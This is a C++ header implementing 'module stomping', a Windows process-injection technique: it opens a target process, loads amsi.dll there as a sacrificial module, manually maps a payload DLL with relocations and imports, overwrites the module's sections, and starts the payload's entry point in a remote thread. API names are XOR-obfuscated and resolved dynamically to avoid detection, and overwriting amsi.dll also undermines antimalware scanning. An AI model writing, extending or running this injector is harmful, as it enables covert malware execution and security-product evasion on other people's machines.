#pragma once
#include <iostream>
#include <string>
#include <windows.h>


#include "Logger.h"
#include "Nt.h"
#include "PE.h"
#include "Syscalls.h"
#include "XorStr.h"


// Module Stomper with Logging and PE Loader (Relocs/Imports).

class ModuleStomper {
public:
  static bool Inject(int pid, const char *dllPath) {
    // Dynamic Resolution
    using f_OpenProcess = HANDLE(WINAPI *)(DWORD, BOOL, DWORD);
    using f_CreateRemoteThread =
        HANDLE(WINAPI *)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
                         LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    using f_VirtualAllocEx =
        LPVOID(WINAPI *)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    using f_WriteProcessMemory =
        BOOL(WINAPI *)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
    using f_WaitForSingleObject = DWORD(WINAPI *)(HANDLE, DWORD);
    using f_GetExitCodeThread = BOOL(WINAPI *)(HANDLE, LPDWORD);
    using f_CloseHandle = BOOL(WINAPI *)(HANDLE);
    using f_VirtualFreeEx = BOOL(WINAPI *)(HANDLE, LPVOID, SIZE_T, DWORD);
    using f_VirtualProtectEx =
        BOOL(WINAPI *)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
    using f_GetModuleInformation =
        BOOL(WINAPI *)(HANDLE, HMODULE, LPMODULEINFO, DWORD);

    auto pOpenProcess = (f_OpenProcess)Syscalls::GetAPI(XSTRING("OpenProcess"));
    auto pCreateRemoteThread =
        (f_CreateRemoteThread)Syscalls::GetAPI(XSTRING("CreateRemoteThread"));
    auto pVirtualAllocEx =
        (f_VirtualAllocEx)Syscalls::GetAPI(XSTRING("VirtualAllocEx"));
    auto pWriteProcessMemory =
        (f_WriteProcessMemory)Syscalls::GetAPI(XSTRING("WriteProcessMemory"));
    auto pWaitForSingleObject =
        (f_WaitForSingleObject)Syscalls::GetAPI(XSTRING("WaitForSingleObject"));
    auto pGetExitCodeThread =
        (f_GetExitCodeThread)Syscalls::GetAPI(XSTRING("GetExitCodeThread"));
    auto pCloseHandle = (f_CloseHandle)Syscalls::GetAPI(XSTRING("CloseHandle"));
    auto pVirtualFreeEx =
        (f_VirtualFreeEx)Syscalls::GetAPI(XSTRING("VirtualFreeEx"));
    auto pVirtualProtectEx =
        (f_VirtualProtectEx)Syscalls::GetAPI(XSTRING("VirtualProtectEx"));

    // K32GetModuleInformation is in kernel32 usually
    HMODULE hKernel32 = Syscalls::GetModuleHandle_Custom(L"kernel32.dll");
    auto pK32GetModuleInformation =
        (f_GetModuleInformation)Syscalls::GetProcAddress_Custom(
            hKernel32, XSTRING("K32GetModuleInformation"));
    // Fallback if not found (older systems or stripped)
    if (!pK32GetModuleInformation) {
      HMODULE hPsapi = LoadLibraryA("psapi.dll");
      if (hPsapi)
        pK32GetModuleInformation = (f_GetModuleInformation)GetProcAddress(
            hPsapi, "GetModuleInformation");
    }

    if (!pOpenProcess || !pVirtualProtectEx)
      return false;

    HANDLE hProcess = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
      Logger::Log("Failed to open process for Module Stomping.");
      return false;
    }

    HANDLE hFile = CreateFileA(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
      Logger::Log("Failed to read DLL file.");
      pCloseHandle(hProcess);
      return false;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE *pDllBuffer = new BYTE[fileSize];
    DWORD bytesRead;
    ReadFile(hFile, pDllBuffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pDllBuffer;
    PIMAGE_NT_HEADERS pNtHeaders =
        (PIMAGE_NT_HEADERS)(pDllBuffer + pDosHeader->e_lfanew);

    Logger::Log("Loading sacrificial DLL (amsi.dll)...");
    FARPROC pLoadLibraryA =
        Syscalls::GetProcAddress_Custom(hKernel32, XSTRING("LoadLibraryA"));

    const char *sacrificialDll = "amsi.dll";

    void *pRemotePath = pVirtualAllocEx(
        hProcess, NULL, strlen(sacrificialDll) + 1, MEM_COMMIT, PAGE_READWRITE);
    pWriteProcessMemory(hProcess, pRemotePath, sacrificialDll,
                        strlen(sacrificialDll) + 1, NULL);

    HANDLE hThread = pCreateRemoteThread(hProcess, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)pLoadLibraryA,
                                         pRemotePath, 0, NULL);
    pWaitForSingleObject(hThread, INFINITE);
    DWORD exitCode;
    pGetExitCodeThread(hThread, &exitCode);
    pCloseHandle(hThread);
    pVirtualFreeEx(hProcess, pRemotePath, 0, MEM_RELEASE);

    HMODULE hTargetModule = (HMODULE)exitCode;
    if (!hTargetModule) {
      Logger::Log("Failed to load sacrificial module.");
      pCloseHandle(hProcess);
      delete[] pDllBuffer;
      return false;
    }
    Logger::Log("Sacrificial module loaded at: %p", hTargetModule);

    // Check size of sacrificial module
    MODULEINFO modInfo;
    if (pK32GetModuleInformation &&
        pK32GetModuleInformation(hProcess, hTargetModule, &modInfo,
                                 sizeof(MODULEINFO))) {
      if (modInfo.SizeOfImage < pNtHeaders->OptionalHeader.SizeOfImage) {
        Logger::Log("WARNING: Payload size (%d) > Sacrificial size (%d). "
                    "Injection WILL fail/crash.",
                    pNtHeaders->OptionalHeader.SizeOfImage,
                    modInfo.SizeOfImage);
        // We proceed but warn. In production, we should bail or pick another
        // DLL.
      }
    }

    // Allocate Local Buffer for fixups
    void *pLocalImage =
        VirtualAlloc(NULL, pNtHeaders->OptionalHeader.SizeOfImage,
                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pLocalImage) {
      Logger::Log("Local allocation failed.");
      delete[] pDllBuffer;
      pCloseHandle(hProcess);
      return false;
    }

    // Copy Headers
    memcpy(pLocalImage, pDllBuffer, pNtHeaders->OptionalHeader.SizeOfHeaders);

    // Copy Sections (to local image first)
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
      void *pDest = (BYTE *)pLocalImage + pSectionHeader[i].VirtualAddress;
      void *pSrc = pDllBuffer + pSectionHeader[i].PointerToRawData;
      DWORD size = pSectionHeader[i].SizeOfRawData;
      if (size == 0)
        continue;
      memcpy(pDest, pSrc, size);
    }

    // Fix Relocations (Targeting hTargetModule)
    Logger::Log("Applying Relocations...");
    if (!PE::ApplyRelocations(pLocalImage, (ULONG_PTR)hTargetModule,
                              pDllBuffer)) {
      Logger::Log("Failed to apply relocations.");
    }

    // Resolve Imports
    Logger::Log("Resolving Imports...");
    if (!PE::ResolveImports(pLocalImage, pDllBuffer, hProcess)) {
      Logger::Log("Failed to resolve imports.");
      VirtualFree(pLocalImage, 0, MEM_RELEASE);
      delete[] pDllBuffer;
      pCloseHandle(hProcess);
      return false;
    }

    // Overwrite module sections in Remote Process
    // We write the whole image or just sections?
    // Since we fixed up the whole pLocalImage, we can write sections from it.
    // Actually, better to write sections individually to match permissions or
    // just write all if valid. Stomping usually overwrites sections. Headers
    // might need to stay original to satisfy some checks, BUT if we want our
    // code to run, we might need our headers if we rely on them? Usually, we
    // overwrite everything we can.

    Logger::Log("Overwriting remote module...");
    pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
      void *pDest = (BYTE *)hTargetModule + pSectionHeader[i].VirtualAddress;
      void *pSrc = (BYTE *)pLocalImage +
                   pSectionHeader[i].VirtualAddress; // fixed up source
      DWORD size = pSectionHeader[i].SizeOfRawData;  // or VirtualSize?

      // Unprotect
      DWORD oldProtect;
      pVirtualProtectEx(hProcess, pDest, size, PAGE_EXECUTE_READWRITE,
                        &oldProtect);
      pWriteProcessMemory(hProcess, pDest, pSrc, size, NULL);
      pVirtualProtectEx(hProcess, pDest, size, oldProtect, &oldProtect);
    }

    // Fix entry point execution
    void *pEntryPoint =
        (BYTE *)hTargetModule + pNtHeaders->OptionalHeader.AddressOfEntryPoint;

    Logger::Log("Executing Entry Point %p...", pEntryPoint);
    hThread = pCreateRemoteThread(hProcess, NULL, 0,
                                  (LPTHREAD_START_ROUTINE)pEntryPoint,
                                  hTargetModule, 0, NULL);

    // Cleanup
    VirtualFree(pLocalImage, 0, MEM_RELEASE);
    delete[] pDllBuffer;

    if (hThread) {
      pCloseHandle(hThread);
      pCloseHandle(hProcess);
      Logger::Log("Module Stomping completed.");
      return true;
    }

    pCloseHandle(hProcess);
    return false;
  }
};
